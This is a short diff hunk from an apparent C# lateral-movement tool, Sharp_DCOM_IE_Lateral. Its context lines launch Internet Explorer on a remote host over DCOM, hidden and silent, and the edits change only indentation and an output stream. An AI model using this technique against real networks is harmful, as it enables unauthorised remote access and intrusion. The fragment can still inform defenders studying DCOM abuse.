@@ -24,10 +24,10 @@ namespace Sharp_DCOM_IE_Lateral
                     Type DCOMServerType = Type.GetTypeFromProgID("InternetExplorer.Application", hostName);
                     object ieObj = Activator.CreateInstance(DCOMServerType);
                     object[] fArray = new object[] { false };
-					object[] tArray = new object[] { true };
+		    object[] tArray = new object[] { true };
                     DCOMServerType.InvokeMember("Visible", System.Reflection.BindingFlags.SetProperty, null, ieObj, fArray);
                     DCOMServerType.InvokeMember("Silent", System.Reflection.BindingFlags.SetProperty, null, ieObj, tArray);
-                    Console.Error.WriteLine("[+] Remote DCOM Successful Against: " + hostName);
+                    Console.WriteLine("[+] Remote DCOM Successful Against: " + hostName);
                 }
                 catch (COMException comError)
                 {
